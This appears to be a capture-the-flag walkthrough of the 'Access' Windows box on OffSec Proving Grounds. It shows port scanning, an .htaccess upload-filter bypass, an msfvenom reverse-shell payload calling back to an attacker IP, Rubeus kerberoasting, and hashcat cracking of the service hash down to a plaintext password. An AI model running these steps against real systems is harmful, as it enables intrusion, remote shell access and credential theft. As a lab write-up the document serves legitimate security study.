# Access

## Intro

Access is a 'get to work' category intermediate Windows box hosted by offsec proving grounds.  

## Enum

### Nmap

All tcp ports.  

```
53/tcp    open  domain        syn-ack ttl 125 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 125 Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
88/tcp    open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2023-10-06 14:09:13Z)
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 125
464/tcp   open  kpasswd5?     syn-ack ttl 125
593/tcp   open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 125
3268/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 125
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 125 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49697/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
```

### Directory fuzzing

```
uploads
assets
forms
webalizer
phpmyadmin
Assets
Uploads
Forms
ticket.php
licenses
server-status
con
con.php
FORMS
UPLOADS
aux.php
aux
Ticket.php
prn
prn.php
server-info
ASSETS
Con.php
Con
UpLoads
```

## File upload

After trying to beat the filter and change the size due to my theory of the vulnerability being Image Magick, I researched a file upload  
vulnerability using htaccess file. Adding the following and uploading as .htaccess, all .php17 extensions will execute as php.  

```
AddType application/x-httpd-php .php17
```


Any webshell with an extension .php17 can be uploaded.  


## User shell

The following shell is uploaded and executed.  

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.196 LPORT=4444 -f exe > usershell.exe
```

## Lateral movement

As there is another user running as the service MSSQL, kerberoasting the password is as follows.  


Using Rubeus.exe  

```
C:\Windows\Temp\Rubeus.exe kerberoast /outfile:C:\xampp\htdocs\uploads\hashes.kerberoast
```

After transferring the file, cracking with hashcat.  

```
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
```

Which gives the cracked clear text password.  

```
trustno1
```


